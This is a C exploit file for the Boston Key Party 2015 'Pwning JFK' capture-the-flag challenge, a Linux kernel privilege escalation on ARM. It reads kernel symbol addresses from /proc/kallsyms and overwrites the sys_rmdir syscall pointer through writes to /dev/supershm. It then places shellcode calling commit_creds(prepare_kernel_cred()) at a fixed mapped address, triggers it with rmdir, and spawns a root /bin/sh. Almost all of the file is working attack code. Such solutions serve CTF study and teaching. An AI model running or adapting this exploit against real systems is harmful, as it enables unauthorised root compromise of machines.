
/*
 * Boston Key Party 2015 - Pwning JFK (http://bostonkey.party/)
 *
 * Copyright (c) 2015 - Albert Puigsech Galicia (albert@puigsech.com)
 *
 * Permission is hereby granted, free of charge, to any person obtaining a
 * copy of this software and associated documentation files (the "Software"),
 * to deal in the Software without restriction, including without limitation
 * the rights to use, copy, modify, merge, publish, distribute, sublicense,
 * and/or sell copies of the Software, and to permit persons to whom the
 * Software is furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT.  IN NO EVENT SHALL
 * THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING
 * FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER
 * DEALINGS IN THE SOFTWARE.
 *
 */

/*
 * HOWTO:
 * 
 * 1. Get symbols
 * 
 *    $ cat /proc/kallsyms | grep T | grep sys_call_table
 *    c0013e68 T sys_call_table
 *    $ cat /proc/kallsyms | grep T |grep prepare_kernel_cred
 *    c00387f4 T prepare_kernel_cred
 *    $ cat /proc/kallsyms | grep T |grep commit_creds
 *    c00384b4 T commit_creds
 *
 */

#include <stdio.h>
#include <string.h>

#define PAGE_SIZE 			0x1000
#define PAGE_MASK			0xfffff000
#define PAGE_ALIGN(addr)	(void*)((unsigned int)addr&PAGE_MASK)

#define SYM_sys_call_table	(void *)0xc0013e68
#define SYM_prepare_creds	(void *)0xc00387f4
#define SYM_commit_creds	(void *)0xc00384b4

#define rmdir_offset		0xa0

#define shellcode_area		(void *)0x11111110


/*
# WRITE SYS_RMDIR ptr
printf "cA" > /dev/supershm
printf "cB" > /dev/supershm
printf "dA" > /dev/supershm
printf "cXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX\x08\x3f\x01\xc01111AAAA" > /dev/supershm
printf "uAAAA" > /dev/supershm
printf "\xb0\xbe\xad\xde:" > /dev/supershm
*/

// Simple shellcode to call commit_creds(prepare_kernel_cred())
unsigned char sc[] = "\xff\x5f\x2d\xe9\x01\x00\x00\xeb\x41\x41\x41\x41\x42\x42\x42\x42"
					 "\x0e\x70\xa0\xe1\x30\x00\xb7\xe8\x00\x00\x20\xe0\x34\xff\x2f\xe1"
					 "\x35\xff\x2f\xe1\xff\x9f\xbd\xe8";


int main(int argc, char **argv) {
	char *exec_argv[2] = {"/bin/sh", NULL};

	// Prepare shellcode
	*(unsigned int *)(&sc[8]) = (unsigned int)SYM_prepare_creds;
	*(unsigned int *)(&sc[12]) = (unsigned int)SYM_commit_creds;

	// Shellcode placement
	mmap(PAGE_ALIGN(shellcode_area), PAGE_SIZE, 0777,0x2032, 0, 0);

	memcpy(shellcode_area, sc, sizeof(sc));

	rmdir("/");
	execve("/bin/sh", exec_argv, NULL);
}